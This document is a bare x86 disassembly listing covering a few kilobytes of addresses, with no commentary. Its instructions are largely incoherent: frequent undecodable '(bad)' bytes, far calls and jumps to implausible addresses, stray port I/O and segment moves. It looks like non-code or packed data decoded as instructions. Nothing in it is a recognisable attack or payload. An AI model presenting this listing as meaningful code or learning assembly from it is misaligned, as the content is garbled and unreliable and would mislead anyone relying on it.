  420b81:	sbb    DWORD PTR [edi-0x1e],esp
  420b84:	loop   0x420b44
  420b86:	mov    bl,0xc5
  420b88:	sub    eax,0x7c8e54ce
  420b8d:	out    dx,al
  420b8e:	inc    esp
  420b8f:	sub    esi,edi
  420b91:	jbe    0x420bcf
  420b93:	push   ebx
  420b94:	or     eax,0x74511493
  420b99:	pop    edi
  420b9a:	call   0xb7bf96fb
  420b9f:	jbe    0x420bbe
  420ba1:	loope  0x420bca
  420ba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba4:	idiv   DWORD PTR [edx+0x29]
  420ba7:	sbb    bh,bh
  420ba9:	jg     0x420b52
  420bab:	test   eax,0x9f0312d8
  420bb0:	fild   QWORD PTR [edx-0x34]
  420bb3:	mov    ecx,0x6ba49a3c
  420bb8:	stc    
  420bb9:	sub    eax,0xbd8d2486
  420bbe:	jne    0x420b88
  420bc0:	daa    
  420bc1:	inc    ebp
  420bc2:	mov    ch,0x6d
  420bc4:	dec    ebx
  420bc5:	not    DWORD PTR [esi]
  420bc7:	push   esp
  420bc8:	ins    BYTE PTR es:[edi],dx
  420bc9:	retf   0xa1f4
  420bcc:	pop    eax
  420bcd:	fsubr  DWORD PTR [eax+edx*2]
  420bd0:	inc    ebx
  420bd1:	jb     0x420bcc
  420bd3:	sbb    BYTE PTR [edx],cl
  420bd5:	daa    
  420bd6:	int3   
  420bd7:	add    DWORD PTR [ebp+edx*1-0x6b],0xffffffdf
  420bdc:	xchg   DWORD PTR [edx-0x1f4b6df7],esi
  420be2:	inc    ebp
  420be3:	hlt    
  420be4:	adc    eax,0x357b5442
  420be9:	ja     0x420c10
  420beb:	mov    dl,0x4a
  420bed:	adc    al,0x64
  420bef:	rcr    BYTE PTR [eax+esi*8-0x74ba9cb0],0x91
  420bf7:	inc    ecx
  420bf8:	or     cl,BYTE PTR [esi+0x3e86f19]
  420bfe:	mov    ds:0x859c433d,eax
  420c03:	ins    BYTE PTR es:[edi],dx
  420c04:	add    al,0x21
  420c06:	or     al,0xa3
  420c08:	imul   edx,DWORD PTR [eax-0x3c],0xffffffbe
  420c0c:	into   
  420c0d:	test   eax,0x48480f68
  420c12:	cmp    DWORD PTR [edi+0x124c219d],esp
  420c18:	or     edi,DWORD PTR [edi+ecx*1]
  420c1b:	push   esi
  420c1c:	call   0x1aba:0x4feee652
  420c23:	push   ecx
  420c24:	pop    ebp
  420c25:	pop    edx
  420c26:	cmp    eax,ebp
  420c28:	push   cs
  420c29:	mov    WORD PTR [eax+0x1d],cs
  420c2c:	dec    eax
  420c2d:	or     BYTE PTR [edx+0x2],dl
  420c30:	fucompp 
  420c32:	mul    DWORD PTR [edx]
  420c34:	fistp  WORD PTR [edi]
  420c36:	aaa    
  420c37:	lods   al,BYTE PTR ds:[esi]
  420c38:	push   0x7989757d
  420c3d:	ja     0x420bd6
  420c3f:	push   ebp
  420c40:	arpl   WORD PTR [eax],di
  420c42:	ds dec eax
  420c44:	loope  0x420bc8
  420c46:	jle    0x420bc9
  420c48:	outs   dx,BYTE PTR ds:[esi]
  420c49:	push   0x2817eddd
  420c4e:	loope  0x420c63
  420c50:	fnstsw WORD PTR ss:[eax+0x34a03606]
  420c57:	pop    es
  420c58:	xor    eax,0x200b55c1
  420c5d:	ins    DWORD PTR es:[edi],dx
  420c5e:	arpl   WORD PTR [ebp+0x1],di
  420c61:	dec    eax
  420c62:	pop    ds
  420c63:	pusha  
  420c64:	sar    DWORD PTR [ebp-0x2babfa9],cl
  420c6a:	shr    DWORD PTR [edx+0x129],cl
	...
  420cd4:	add    BYTE PTR [eax],al
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0x1b
  420ce3:	stos   DWORD PTR es:[edi],eax
  420ce4:	repnz push ecx
  420ce6:	addr16 pusha 
  420ce8:	add    DWORD PTR [eax],eax
  420cea:	add    BYTE PTR [ecx],al
  420cec:	add    BYTE PTR [eax],al
  420cee:	adc    edi,DWORD PTR [ebp-0x63]
  420cf1:	jne    0x420cf7
  420cf3:	mov    al,0x5c
  420cf5:	mov    ds:0xac0d310c,al
  420cfa:	mov    dl,0x18
  420cfc:	push   cs
  420cfd:	xchg   esp,eax
  420cfe:	mov    dh,0xaf
  420d00:	jp     0x420d60
  420d02:	scas   al,BYTE PTR es:[edi]
  420d03:	icebp  
  420d04:	adc    al,0xe3
  420d06:	call   0x4713:0x12515443
  420d0d:	jg     0x420cb9
  420d0f:	xchg   esp,eax
  420d10:	nop
  420d11:	enter  0x6078,0x6
  420d15:	retf   
  420d16:	cmp    al,0x54
  420d18:	fdiv   st,st(3)
  420d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d1b:	pop    edi
  420d1c:	lahf   
  420d1d:	(bad)  
  420d1e:	in     al,dx
  420d1f:	xor    eax,0x847b55ee
  420d24:	(bad)  
  420d25:	jmp    0x420d70
  420d27:	mov    WORD PTR [esi+0x3c7915c0],di
  420d2e:	dec    ecx
  420d2f:	dec    ecx
  420d30:	dec    esi
  420d31:	(bad)  
  420d33:	xchg   bl,bl
  420d35:	add    BYTE PTR cs:0xd03285d8,ah
  420d3c:	jae    0x420dae
  420d3e:	(bad)  
  420d3f:	addr16 in eax,dx
  420d41:	test   DWORD PTR [ebx-0x24d8f07b],edx
  420d47:	adc    eax,0xda20344f
  420d4c:	inc    esi
  420d4d:	add    al,0x80
  420d4f:	cmc    
  420d50:	jne    0x420da2
  420d52:	pop    edi
  420d53:	dec    ecx
  420d54:	mov    WORD PTR [ecx+0x673bb656],fs
  420d5a:	mul    DWORD PTR [edx-0x76]
  420d5d:	stc    
  420d5e:	add    al,0x8
  420d60:	xchg   esp,eax
  420d61:	add    DWORD PTR [ebx+0x18715a14],esi
  420d67:	pop    ebp
  420d68:	fmulp  st(7),st
  420d6a:	or     al,0x92
  420d6c:	outs   dx,DWORD PTR ds:[esi]
  420d6d:	and    BYTE PTR [ebp-0x6473ebb7],ah
  420d73:	bound  eax,QWORD PTR [eax-0x518b73ac]
  420d79:	pop    ebp
  420d7a:	or     esi,DWORD PTR [edi]
  420d7c:	sub    al,0x26
  420d7e:	ins    DWORD PTR es:[edi],dx
  420d7f:	out    0x4d,al
  420d81:	in     eax,0xca
  420d83:	pop    eax
  420d84:	inc    edi
  420d85:	sahf   
  420d86:	bound  ebx,QWORD PTR [edx+0x6d7881a3]
  420d8c:	xchg   ebp,eax
  420d8d:	into   
  420d8e:	cli    
  420d8f:	add    eax,0xd0bcc4df
  420d94:	dec    esi
  420d95:	sub    eax,0x90461e7e
  420d9a:	aad    0x25
  420d9c:	test   eax,0x3d2944c8
  420da1:	xor    eax,0x48cd46a9
  420da6:	leave  
  420da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420da8:	sub    ebp,DWORD PTR [ebp+eiz*2-0x130ca36b]
  420daf:	scas   al,BYTE PTR es:[edi]
  420db0:	xchg   esi,eax
  420db1:	add    al,0xb9
  420db3:	adc    dl,BYTE PTR [eax]
  420db5:	adc    cl,0x4c
  420db8:	or     edx,DWORD PTR [ebx+0x79]
  420dbb:	push   eax
  420dbc:	out    dx,eax
  420dbd:	in     eax,0xc1
  420dbf:	or     eax,DWORD PTR [eax-0x21d73a3e]
  420dc5:	sub    ch,BYTE PTR [ebp+0x6308667a]
  420dcb:	mov    bl,0x8e
  420dcd:	mov    eax,ds:0x47f69b50
  420dd2:	aad    0xac
  420dd4:	xor    ch,BYTE PTR [edx+0x47]
  420dd7:	dec    esi
  420dd8:	scas   eax,DWORD PTR es:[edi]
  420dd9:	test   dl,cl
  420ddb:	add    eax,0xf9e529ec
  420de0:	and    DWORD PTR [edx-0x1d],0xffffffbc
  420de4:	mov    ebp,0x6a139104
  420de9:	jb     0x420d90
  420deb:	out    dx,al
  420dec:	add    DWORD PTR [eax+0x0],0x0
	...
  420e53:	add    BYTE PTR [eax],al
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0xd9c02c85
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	fldcw  WORD PTR [ecx-0x6b]
  420e71:	lock aaa 
  420e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e74:	leave  
  420e75:	pop    ebp
  420e76:	inc    esp
  420e77:	jns    0x420e3e
  420e79:	(bad)  
  420e7a:	cmc    
  420e7b:	int3   
  420e7c:	mov    esp,0x589576d6
  420e81:	mov    WORD PTR [ebx+ecx*1+0x287bd1e9],?
  420e88:	mov    esi,0xac3c9640
  420e8d:	sub    al,0x5e
  420e8f:	outs   dx,DWORD PTR ds:[esi]
  420e90:	jle    0x420eab
  420e92:	and    eax,DWORD PTR [esi]
  420e94:	(bad)  
  420e95:	push   esp
  420e96:	ret    
  420e97:	pusha  
  420e98:	idiv   DWORD PTR [ecx]
  420e9a:	stc    
  420e9b:	repz mov bh,0x3
  420e9e:	fbld   TBYTE PTR [ecx+0xdc55bc7]
  420ea4:	inc    esi
  420ea5:	mov    ch,0x27
  420ea7:	mov    ah,0x1c
  420ea9:	dec    ecx
  420eaa:	adc    ah,BYTE PTR [edx]
  420eac:	scas   al,BYTE PTR es:[edi]
  420ead:	test   eax,0x392fd8b7
  420eb2:	sub    ebx,ebx
  420eb4:	aaa    
  420eb5:	into   
  420eb6:	std    
  420eb7:	and    cl,BYTE PTR [esi]
  420eb9:	jae    0x420e8f
  420ebb:	scas   al,BYTE PTR es:[edi]
  420ebc:	cmp    eax,0xdff13f68
  420ec1:	jb     0x420ea1
  420ec3:	dec    ebx
  420ec5:	mov    eax,0x4555478a
  420eca:	lods   al,BYTE PTR ds:[esi]
  420ecb:	inc    ebp
  420ecc:	adc    bh,dl
  420ece:	scas   al,BYTE PTR es:[edi]
  420ecf:	adc    edx,ebp
  420ed1:	add    BYTE PTR [edi-0x7bf8a10d],bh
  420ed7:	mov    ch,BYTE PTR [edx+0x7182eb0c]
  420edd:	inc    esp
  420ede:	cwde   
  420edf:	push   esi
  420ee0:	cmc    
  420ee1:	sbb    DWORD PTR [ebx],edi
  420ee3:	cmp    al,BYTE PTR [edi]
  420ee5:	mov    ebp,DWORD PTR [edi+esi*4-0x5d]
  420ee9:	rol    edi,cl
  420eeb:	push   0x1ae2e70e
  420ef0:	cli    
  420ef1:	repnz xor eax,0xab83af9e
  420ef7:	into   
  420ef8:	and    DWORD PTR [esi+edx*8+0x46],edi
  420efc:	dec    ebx
  420efd:	xchg   esi,eax
  420efe:	xchg   DWORD PTR [esi],eax
  420f00:	cdq    
  420f01:	into   
  420f02:	scas   eax,DWORD PTR es:[edi]
  420f03:	popa   
  420f04:	mov    eax,ebx
  420f06:	jnp    0x420ea9
  420f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f09:	(bad)  ds:0xe8ee3050
  420f0f:	add    al,0x1a
  420f11:	xchg   edi,eax
  420f12:	cmp    DWORD PTR ds:0xe2d8db80,ecx
  420f18:	fst    QWORD PTR [edx-0x27]
  420f1b:	push   0xffffff99
  420f1d:	dec    esi
  420f1e:	popa   
  420f1f:	mov    eax,0xf2eb253d
  420f24:	packsswb mm1,QWORD PTR [ecx+0x4c]
  420f28:	(bad)  
  420f29:	pop    ecx
  420f2a:	push   esp
  420f2b:	inc    ecx
  420f2c:	cmp    al,0x5c
  420f2e:	add    BYTE PTR [esi],cl
  420f30:	dec    DWORD PTR [esi+edx*8+0x34]
  420f34:	mov    bh,0x60
  420f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f37:	jo     0x420f4c
  420f39:	mov    edx,0x616b3998
  420f3e:	jno    0x420f70
  420f40:	xor    al,0x7e
  420f42:	(bad)  
  420f43:	pop    edi
  420f44:	pop    ebx
  420f45:	adc    eax,0x164c75ac
  420f4a:	jge    0x420f9b
  420f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f4d:	sbb    dh,cl
  420f4f:	or     BYTE PTR [ebx],0xfc
  420f52:	sub    bl,dl
  420f54:	sar    ah,0x3e
  420f57:	sbb    al,0x4
  420f5a:	and    al,0x89
  420f5c:	pop    eax
  420f5d:	mov    WORD PTR [eax+0x2e207339],gs
  420f63:	ss sahf 
  420f65:	clc    
  420f66:	in     eax,0x43
  420f68:	push   cs
  420f69:	and    ebp,DWORD PTR [esi+0x63]
  420f6c:	mov    ebp,0xc3
	...
  420fd5:	add    BYTE PTR [eax],ah
  420fd7:	xchg   edi,eax
  420fd8:	inc    edx
  420fd9:	shl    edi,cl
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x18a316ff]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    BYTE PTR [edi+0x69eb64fd],cl
  420ff3:	lods   eax,DWORD PTR ds:[esi]
  420ff4:	pop    esi
  420ff5:	adc    bh,BYTE PTR [esi+0x61]
  420ff8:	pop    esp
  420ff9:	sbb    bl,BYTE PTR [edi+0x1625d826]
  420fff:	xchg   edx,eax
  421000:	dec    eax
  421001:	ds mov edx,cs
  421004:	ss fs and eax,0xf823d086
  42100b:	stos   DWORD PTR es:[edi],eax
  42100c:	jb     0x420fb5
  42100e:	add    al,0x95
  421010:	cmp    ebp,DWORD PTR [edi-0x70958ea5]
  421016:	or     esp,ebp
  421018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421019:	inc    edx
  42101a:	retf   0xe50e
  42101d:	add    al,0xc1
  42101f:	not    BYTE PTR [edx+0x56]
  421022:	push   ss
  421023:	scas   eax,DWORD PTR es:[edi]
  421024:	leave  
  421025:	sub    bh,BYTE PTR [eax-0x7ef07f87]
  42102b:	jg     0x421032
  42102d:	cmp    BYTE PTR ss:[edx],0x8a
  421031:	sahf   
  421032:	xchg   esp,eax
  421033:	inc    edi
  421034:	sub    eax,0x1c0d13c7
  421039:	cmc    
  42103a:	mov    ss,WORD PTR [edi+ebx*4-0x2d5ce77e]
  421041:	cdq    
  421042:	popf   
  421043:	out    dx,al
  421044:	add    dl,bh
  421046:	lea    esi,[ebx+0x49]
  421049:	adc    dh,BYTE PTR [edx+0x4b]
  42104c:	lea    ebx,[ecx-0x7114e6dd]
  421052:	xchg   esi,eax
  421053:	push   0x4a
  421055:	sahf   
  421056:	aad    0xf3
  421058:	fnstsw WORD PTR [edx-0x582442d9]
  42105e:	and    esi,edi
  421060:	pop    eax
  421061:	leave  
  421062:	sub    eax,0x760900dd
  421067:	sub    BYTE PTR [ebx],dl
  421069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42106a:	std    
  42106b:	mov    bh,cl
  42106d:	mov    bl,0x68
  42106f:	aaa    
  421070:	dec    edi
  421071:	jns    0x4210e1
  421073:	push   ebx
  421074:	cmp    DWORD PTR [esi+0x20],eax
  421077:	mov    eax,ebp
  421079:	or     dh,dl
  42107b:	fstp   TBYTE PTR [eax+0x5687ffc3]
  421081:	(bad)  
  421082:	or     edx,DWORD PTR [eax-0x6b]
  421085:	js     0x421019
  421087:	xor    al,0x8f
  421089:	add    edi,edi
  42108b:	dec    esi
  42108c:	push   0xffffff92
  42108e:	mov    ah,0x55
  421090:	sbb    eax,DWORD PTR [ebx+0x5e0f2996]
  421096:	push   edx
  421097:	pushf  
  421098:	dec    esi
  421099:	add    ecx,DWORD PTR ds:0xadf494cb
  42109f:	mov    bh,0xdf
  4210a1:	int3   
  4210a2:	pushf  
  4210a3:	test   DWORD PTR ds:0xb9e0d654,ebp
  4210a9:	xor    al,0xc0
  4210ab:	jne    0x421057
  4210ad:	mov    ch,0x78
  4210af:	mov    bl,0xb3
  4210b1:	test   eax,0xa0d21ec6
  4210b6:	jle    0x4210b1
  4210b8:	out    dx,al
  4210b9:	sub    eax,0x3979ffcf
  4210be:	or     al,0xab
  4210c0:	pop    edi
  4210c1:	dec    ecx
  4210c2:	mov    ds:0x5f1e8883,al
  4210c7:	xor    BYTE PTR ds:0x999b29a0,bl
  4210cd:	push   esi
  4210ce:	sub    eax,edx
  4210d0:	ins    BYTE PTR es:[edi],dx
  4210d1:	mov    bl,0x70
  4210d3:	ds push cs
  4210d5:	pop    edx
  4210d6:	cld    
  4210d7:	mov    WORD PTR [edi+0x41],es
  4210da:	mov    cl,0x26
  4210dc:	xor    dh,BYTE PTR ds:0x872432a1
  4210e2:	sahf   
  4210e3:	sub    bh,bh
  4210e5:	(bad)  
  4210e6:	pushf  
  4210e7:	dec    ebp
  4210e8:	les    edi,FWORD PTR [ecx+0x12f229d8]
	...
  421156:	lahf   
  421157:	pop    esi
  421158:	fcmovb st,st(6)
  42115a:	fcmovnb st,st(6)
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    ss,WORD PTR [ebx+0x6739e042]
  421167:	arpl   WORD PTR [ecx],ax
  421169:	add    BYTE PTR [eax],al
  42116b:	add    DWORD PTR [eax],eax
  42116d:	add    dl,dl
  42116f:	push   edi
  421170:	cwd    
  421172:	fisttp WORD PTR [ebx]
  421174:	popa   
  421175:	pop    ecx
  421176:	mov    ds:0x92c42240,eax
  42117b:	test   esi,0xaae5712a
  421181:	(bad)  
  421183:	jge    0x42119c
  421185:	adc    DWORD PTR [esi+0x28],esi
  421188:	and    al,ah
  42118a:	add    bl,ah
  42118c:	mov    cl,0xa0
  42118e:	lahf   
  42118f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  421191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421192:	test   DWORD PTR [edx-0x5b78bbaa],eax
  421198:	xor    eax,0xbd57784f
  42119d:	pop    ebp
  42119e:	inc    edi
  42119f:	inc    eax
  4211a0:	inc    ebp
  4211a1:	sahf   
  4211a2:	imul   esp,DWORD PTR [eax],0xffffffc4
  4211a5:	push   ds
  4211a6:	push   eax
  4211a7:	mov    dl,0x1b
  4211a9:	stos   BYTE PTR es:[edi],al
  4211aa:	push   0xffffffbe
  4211ac:	stos   DWORD PTR es:[edi],eax
  4211ad:	lods   al,BYTE PTR ds:[esi]
  4211ae:	pop    ebp
  4211af:	jmp    0x793778e7
  4211b4:	xor    al,bl
  4211b6:	repnz scas eax,DWORD PTR es:[edi]
  4211b8:	xor    eax,DWORD PTR [ebp-0x5377f927]
  4211be:	ins    DWORD PTR es:[edi],dx
  4211bf:	jp     0x4211dd
  4211c1:	jmp    0x32711623
  4211c6:	pop    ebx
  4211c7:	cmp    al,0x1e
  4211c9:	mov    esp,0x8c371689
  4211ce:	sub    ebx,ebp
  4211d0:	ror    DWORD PTR [edi],0x7f
  4211d3:	dec    ebp
  4211d4:	aas    
  4211d5:	push   0x60
  4211d7:	outs   dx,DWORD PTR ds:[esi]
  4211d8:	xchg   DWORD PTR [edi+0x7b22e38f],esi
  4211de:	inc    ebx
  4211df:	sub    dl,cl
  4211e1:	add    ch,dh
  4211e3:	xlat   BYTE PTR ds:[ebx]
  4211e4:	lea    esi,[esi]
  4211e6:	and    eax,0xca162c32
  4211eb:	jo     0x4211b7
  4211ed:	outs   dx,DWORD PTR ds:[esi]
  4211ee:	fldcw  WORD PTR [ecx-0x60]
  4211f2:	lods   al,BYTE PTR ds:[esi]
  4211f3:	test   al,dl
  4211f5:	push   cs
  4211f6:	mov    ebx,0x18e7b651
  4211fb:	test   DWORD PTR [ecx+0x6ac8e559],ecx
  421201:	mov    bh,0xfe
  421203:	add    BYTE PTR ds:0x12caa4cb,ah
  421209:	push   0xf6c65293
  42120e:	or     al,0xc7
  421210:	jmp    0x9461ad34
  421215:	add    ebp,DWORD PTR [ecx+0x2ac151f4]
  42121b:	loopne 0x421283
  42121d:	mul    DWORD PTR [esi]
  42121f:	or     esi,ebp
  421221:	pop    eax
  421222:	xchg   edx,eax
  421223:	mov    edi,0xdb40bfc
  421228:	mov    WORD PTR [ebx+0x61c6b3a5],ds
  42122e:	sbb    BYTE PTR [eax+0x43fecb32],0xcb
  421235:	push   edx
  421236:	jle    0x421272
  421238:	cli    
  421239:	popf   
  42123a:	or     bh,BYTE PTR [esi-0x4a]
  42123d:	aas    
  42123e:	mov    ah,al
  421240:	aad    0xec
  421242:	mov    eax,0x951ad278
  421247:	inc    esp
  421248:	fst    DWORD PTR ds:0xe39ae62
  42124e:	cmc    
  42124f:	dec    esp
  421250:	fist   WORD PTR [eax]
  421252:	xor    DWORD PTR [eax+esi*2],edi
  421255:	mov    dh,0x0
  421257:	and    eax,0xfaf85d16
  42125c:	mov    WORD PTR [edx],cs
  42125e:	test   al,0x15
  421260:	mov    ds:0xf2da0478,al
  421265:	fisubr WORD PTR [esi]
  421267:	lods   al,BYTE PTR ds:[esi]
  421268:	std    
  421269:	repz xor ch,al
  42126c:	mov    edi,0x91
	...
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0x611f7ab3
  4212e4:	lea    esi,[edx+0x16467]
  4212ea:	add    BYTE PTR [ecx],al
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	lods   eax,DWORD PTR ds:[esi]
  4212ef:	imul   ebx,DWORD PTR [ebx],0x8190c749
  4212f5:	pusha  
  4212f6:	ja     0x421338
  4212f8:	and    al,0x1d
  4212fa:	int3   
  4212fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212fc:	enter  0x945f,0xda
  421300:	sbb    eax,0xa12594c0
  421305:	cmp    eax,0x64af3a5b
  42130a:	pop    esp
  42130b:	sbb    al,0x2
  42130d:	fdiv   st,st(7)
  42130f:	push   eax
  421310:	pop    eax
  421311:	lock pop ecx
  421313:	test   eax,0x21ad493a
  421318:	mov    ?,WORD PTR [bp+di]
  42131b:	sub    cx,WORD PTR [edx+0x73]
  42131f:	sbb    bl,bl
  421321:	mov    dh,BYTE PTR [edx]
  421323:	hlt    
  421324:	in     al,0xc4
  421326:	dec    ecx
  421327:	fs xchg edi,eax
  421329:	mov    ah,BYTE PTR [edx+ecx*2-0x5e2634c4]
  421330:	mov    ah,0xb7
  421332:	and    al,0x42
  421334:	jge    0x4212d8
  421336:	mov    ds:0xbdd0e68a,eax
  42133b:	push   ebp
  42133c:	sbb    eax,0x7d2710
  421341:	test   DWORD PTR [ebp+0x3d],0x2296a1a9
  421348:	jp     0x42132b
  42134a:	(bad)  
  42134b:	mov    al,0x73
  42134d:	xchg   DWORD PTR [edi-0x4b],edi
  421350:	adc    edi,DWORD PTR [ebp-0x74]
  421353:	cmp    cl,BYTE PTR [ebx]
  421355:	xchg   esi,eax
  421356:	jns    0x4212e5
  421358:	and    dh,BYTE PTR [esi+0x66]
  42135b:	adc    eax,0x44fa3b6
  421360:	sub    dh,dl
  421362:	push   ecx
  421363:	ror    BYTE PTR [esi+0x69e9ebcd],0x71
  42136a:	jno    0x4213d2
  42136c:	sbb    al,0xb7
  42136e:	add    al,0xf
  421370:	mov    bh,0x3c
  421372:	test   dl,cl
  421374:	outs   dx,BYTE PTR ds:[esi]
  421375:	outs   dx,DWORD PTR ds:[esi]
  421376:	ret    
  421377:	les    edx,FWORD PTR [edx-0x176a8f74]
  42137d:	imul   edx,DWORD PTR [ebp+0x43f6629c],0x6f
  421384:	bnd js 0x421364
  421387:	cmp    BYTE PTR [edi+0x48bb9d24],dl
  42138d:	(bad)  
  42138e:	stos   BYTE PTR es:[edi],al
  42138f:	inc    ebx
  421390:	mov    edi,0x3b2cb916
  421395:	pop    ebp
  421396:	mov    ebp,0x7e2b34dc
  42139b:	or     eax,0x263c95bd
  4213a0:	and    BYTE PTR [ebp-0x7bbc3733],0x26
  4213a7:	(bad)  
  4213a9:	inc    esi
  4213aa:	fdiv   QWORD PTR [ebp+0x8]
  4213ad:	jle    0x4213b4
  4213af:	cli    
  4213b0:	repz xor BYTE PTR [edi],0x3e
  4213b4:	aam    0x10
  4213b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213b7:	jge    0x421393
  4213b9:	xchg   esi,eax
  4213ba:	pop    ss
  4213bb:	les    ebx,FWORD PTR ds:0xf552b8ab
  4213c1:	and    bl,bl
  4213c3:	ins    BYTE PTR es:[edi],dx
  4213c4:	pop    esp
  4213c5:	pop    ebp
  4213c6:	scas   al,BYTE PTR es:[edi]
  4213c7:	cdq    
  4213c8:	lahf   
  4213c9:	cld    
  4213ca:	jmp    0x4213e6
  4213cc:	sub    bh,al
  4213ce:	dec    ecx
  4213cf:	mov    al,0x65
  4213d1:	sbb    ecx,edi
  4213d3:	retf   0x2bd1
  4213d6:	in     al,dx
  4213d7:	xchg   edx,eax
  4213d8:	cmp    ebx,ecx
  4213da:	add    DWORD PTR [edx+0x15],esp
  4213dd:	je     0x42136f
  4213df:	mov    dl,0xfc
  4213e1:	loop   0x421413
  4213e3:	stos   DWORD PTR es:[edi],eax
  4213e4:	fs xor eax,esp
  4213e7:	lods   eax,DWORD PTR ds:[esi]
  4213e8:	add    al,0x57
  4213ea:	call   0x0:0xf08063
	...
  421455:	add    dh,bh
  421457:	(bad)  
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp-0x2f370b61]
  421464:	and    BYTE PTR [esi+0x67],cl
  421467:	add    DWORD PTR gs:[eax],eax
  42146a:	add    BYTE PTR [ecx],al
  42146c:	add    BYTE PTR [eax],al
  42146e:	mov    eax,ds:0xbe036e4a
  421473:	mov    eax,ds:0x35b080f5
  421478:	add    DWORD PTR [ebx-0x5c257a3d],0x3c4eb084
  421482:	add    eax,0x61a2d0c9
  421487:	stc    
  421488:	sbb    al,0x76
  42148a:	lds    ebp,FWORD PTR [ebx-0x12fa6f25]
  421490:	jp     0x421419
  421492:	xor    eax,0xbf452dc4
  421497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421498:	and    ecx,esp
  42149a:	add    eax,0x16d4da92
  42149f:	jno    0x4214b5
  4214a1:	pop    ebx
  4214a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a3:	jecxz  0x4214c8
  4214a5:	mov    ds:0x21e0524f,eax
  4214aa:	(bad)  
  4214ab:	cs mov bh,0x25
  4214ae:	icebp  
  4214af:	outs   dx,BYTE PTR ds:[esi]
  4214b0:	scas   al,BYTE PTR es:[edi]
  4214b1:	leave  
  4214b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214b3:	lds    esp,FWORD PTR [edx-0x5feafd82]
  4214b9:	ins    BYTE PTR es:[edi],dx
  4214ba:	out    dx,al
  4214bb:	ja     0x421473
  4214bd:	pop    ds
  4214be:	enter  0xb7af,0xbb
  4214c2:	push   0x942ee02b
  4214c7:	call   0xfa1:0x40daffd7
  4214ce:	pop    ebp
  4214cf:	pop    ss
  4214d0:	jecxz  0x421530
  4214d2:	stos   BYTE PTR es:[edi],al
  4214d3:	call   0xc78794e
  4214d8:	or     BYTE PTR [esi-0x4c],0xf0
  4214dc:	inc    ecx
  4214dd:	adc    eax,0xe866d24b
  4214e2:	inc    BYTE PTR [eax-0x77]
  4214e5:	fisttp QWORD PTR ds:0x6f6489a0
  4214eb:	push   cs
  4214ec:	pop    es
  4214ed:	popa   
  4214ee:	fnstsw WORD PTR [ebp-0x55]
  4214f1:	retf   
  4214f2:	aad    0x59
  4214f4:	jmp    0x421479
  4214f6:	repz mov ecx,0x470743ea
  4214fc:	xchg   ebx,eax
  4214fd:	out    0x4f,al
  4214ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421500:	(bad)  
  421501:	(bad)  [ebp+0x27]
  421504:	inc    ebp
  421505:	mov    esp,0x67664497
  42150a:	and    esp,ebp
  42150c:	dec    ecx
  42150d:	es retf 0xc53a
  421511:	scas   eax,DWORD PTR es:[edi]
  421512:	jl     0x421556
  421514:	jge    0x421584
  421516:	or     cl,BYTE PTR [edi]
  421518:	ret    0xb0a6
  42151b:	xor    al,0x95
  42151d:	(bad)  
  42151e:	sbb    DWORD PTR [eax+0x2826ca02],esp
  421524:	fwait
  421525:	xchg   esp,eax
  421526:	dec    edx
  421527:	sbb    BYTE PTR [ecx-0x64],0xcf
  42152b:	xchg   ecx,eax
  42152c:	fild   QWORD PTR [esi+0x406f71e4]
  421532:	pop    esi
  421533:	stos   BYTE PTR es:[edi],al
  421534:	out    0x6f,eax
  421536:	nop
  421537:	or     bh,bl
  421539:	dec    ecx
  42153a:	xchg   DWORD PTR [edx+0x17],ebx
  42153d:	or     al,0x37
  421540:	jp     0x421520
  421542:	test   al,0xd5
  421544:	sub    eax,0xc9553705
  421549:	add    bh,BYTE PTR [ecx+0x8ae9fbf]
  42154f:	imul   esi,DWORD PTR [ebx],0x795cd45
  421555:	push   esp
  421556:	adc    DWORD PTR [esi+0x5b],ebp
  421559:	out    0x43,eax
  42155b:	pop    esp
  42155c:	pop    ebp
  42155d:	jmp    0xa27e7010
  421562:	inc    edx
  421563:	add    edi,DWORD PTR [ecx+0x2050d746]
  421569:	sbb    al,0x8b
  42156b:	push   cs
  42156c:	dec    edx
  42156d:	sub    eax,DWORD PTR [eax]
	...
  4215d3:	add    BYTE PTR [eax],al
  4215d5:	add    dh,dl
  4215d7:	repnz test BYTE PTR [eax],bl
